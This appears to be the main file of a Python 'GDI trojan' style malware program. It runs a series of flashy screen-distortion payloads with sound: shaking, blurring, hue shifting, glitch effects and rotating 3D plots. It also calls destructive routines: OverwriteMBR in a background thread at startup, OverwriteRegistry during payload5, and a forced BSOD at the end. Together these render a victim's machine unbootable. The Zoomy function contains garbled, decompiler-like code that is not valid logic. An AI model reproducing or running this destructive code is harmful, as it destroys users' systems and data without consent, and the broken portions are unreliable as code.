from Utils import *
import time
from random import randint, uniform
from threading import _start_new_thread
import numba as nb
from Destruction import *

class CursorTrails:
    def _1():
        c = GetCursorPos()
        CustomCircle(HUE(round(time.time() * 100)), out_w=2, x=c[0], y=c[1], add=False)
        Sleep(10)

def Zoomy(times=10):
    try:
        im = getPILScreen()
        for i in range(times):
            zoomer = zoom_at(im, zoom=1 + (i + 1) / (times + 1))
            drawPIL(dc, zoomer)
        for i in range(times + 1):
            zoomer = zoom_at(im, zoom=2 - (i + 1) / (times + 1))
            drawPIL(dc, zoomer)
    finally:
        pass
    if Exception:
        Exception
        e = __exception__
        __exception__
        try:
            print(e)
        finally:
            pass
        return

def payload1():
    playsound(path("rave.wav"))
    
    for i in range(150):
        Shake(2, 1, 0.1)
        im1 = getPILScreen().filter(ImageFilter.BoxBlur(4))
        if i % 7 == 0 and i != 0:
            Zoomy(int(11 - (i + 1) / 15))
        if i % 3 == 0:
            im1 = ImageOps.solarize(im1, 40)
        if i % 5 == 0:
            im1 = add_vignete(im1, 10_000)
        drawPIL(dc, im1)
        Sleep(10)

def payload2():
    playsound(path("banger.wav"))
    figge = plt.figure(figsize=(10, 10))
    axe = figge.add_subplot(111, projection="3d")
    
    u = np.linspace(0, 2 * (np.pi), 100)
    v = np.linspace(0, np.pi, 100)
    
    r = u - v**3.14159
    
    x = 10 * np.outer(np.cos(u), np.sin(v))
    y = 10 * np.outer(np.sin(u), np.sin(v))
    z = 10 * np.outer(np.ones(np.size(u)), np.cos(v))
    
    im = toCV(Image.open(path("rainbow.png")))
    drawBlendedImg(dc, im, 0.5, 0.5)
    ResetAxisIm()
    
    axe.scatter3D(x, y, z, c=y, cmap=choice(["hsv", "hsv", "flag"]), edgecolors="black", s=GetPlotSize(30, x, y))
    drawAx(dc, axe, 500, 300)
    shaker = CustomThread(Shake, [2, 1, 0.1])
    shaker()
    trail = CustomThread(CursorTrails._1)
    trail()
    
    for i in range(150):
        HUEShift(dc, 4)
        Sleep(10)
        if i % 10 == 0:
            ResetAxisIm()
        _start_new_thread(drawAx, (dc, axe, 500 + i * 3 - int(sin((i - 30) * 10) if i > 30 else 0 * i * 10), 300 - i * 5))
        Sleep(600)
    shaker.terminate()
    trail.terminate()
    plt.close("all")
    redraw()
    Sleep(10)

def payload3():
    redraw = choice([False, True])
    intensity = choice([False, True])
    filters = []
    
    fD = [[1, 2],
        [2],
        [0, 2],
        [0, 1],
        [1],
        [0]]
    
    for i in range(5):
        filters.append(choice(fD))
    
    for i in range(130):
        ax = VoxelCube(*HUE(i * 5))
        rotate_shake(randint(-5, 5))
        playsound(path(choice(["step2.wav", "erase.wav", "select3.wav"])))
        Shake(randint(-5, 5), randint(1, 3), 0.01)
        for i in range(i * 2, (i + 1) * 2):
            drawAx(dc, ax, i * 4, i * 4, int(i * 2.5), i, redraw=redraw)
        plt.close("all")
        if i % 5 == 0:
            playsound(path("20.wav"))
            image = getMatScreen()
            filterr = choice(filters)
            image = applyColorFilter(image, channels_indexes=filterr)
            if intensity:
                image = changeIntensity(image, scale_factor=uniform(0.1, 1.0), channels_indexes=filterr)
            drawMat(dc, image)
            Sleep(20)

def payload4():
    voxels = VoxelShape()
    Glitches.PixelSort(dc, mask_default)
    original = getPILScreen()
    rimg = original.copy()
    RGBTurn(7)
    playsound(path("gtg.wav"))
    
    for i in range(80):
        resa = Glitches.NoiseLines(dc, 10, 1, img=rimg)
        Glitches.RgbSplit_Direction(dc, i * 3, img=resa)
        Sleep(10)
        if i % 2 == 0:
            for ai in range(5):
                Glitches.SineWave(dc, i % 25, i % 3 * -1, rand(-15, 15))
            for ai in range(5):
                Glitches.SineWave(dc, i % 25, i % 3 * -1, rand(-15, 15))
        elif i % 9 == 0:
            rimg = getPILScreen()
        if i % 12 == 0:
            PuzzleUp(dc)
        if i % 5 == 0:
            HUEShift(dc, rand(-20, 20))
            Sleep(10)
        if i % 8 == 0:
            rimg = original.copy()
            rimg = pasteAx(rimg, voxels, 200 + i * 5, 200 + i * 5, i * 3, i * 2)

def payload5():
    def part1():
        iexplorer = effects.HUE.xor_only(dc)
        
        for i in range(500):
            ChopScreen(dc, 10 * i + int(abs(math.sin(i) * 20)), 0, img=iexplorer)
    
    def part2():
        redraw()
        Sleep(10)
        effects.HUE.sicksack(dc)
        
        for i in range(75):
            HUEShift(dc, 10 + int(abs(math.sin(i) * 20)))
    
    def part3():
        funcs = [effects.HUE.x,
            effects.HUE.y,
            effects.HUE.sicksack,
            effects.HUE.xor,
            effects.HUE.pow]
        
        for i in range(250):
            random.choice(funcs)(dc)
    
    def part3point5():
        for i in range(200):
            effects.HUE.circle(dc, 2 * i, 100)
    
    def part4():
        for i in range(30):
            effects.HUE.sicksack(dc, i * 100)
            for i in range(2):
                Shake(20, 10, 0.2)
                if i >= 10:
                    for ei in range(5):
                        rotate_shake(randint(-20, 20), SRCCOPY)
            redraw()
            Sleep(10)
    
    effects.compile()
    playsound(path("trillera.wav"))
    
    for i in range(1):
        part1()
        _start_new_thread(OverwriteRegistry, tuple([]))
        part2()
        part3()
        part3point5()
        part4()

_start_new_thread(OverwriteMBR, (1))

payload1()
payload2()
payload3()
payload4()
payload5()
BSOD()
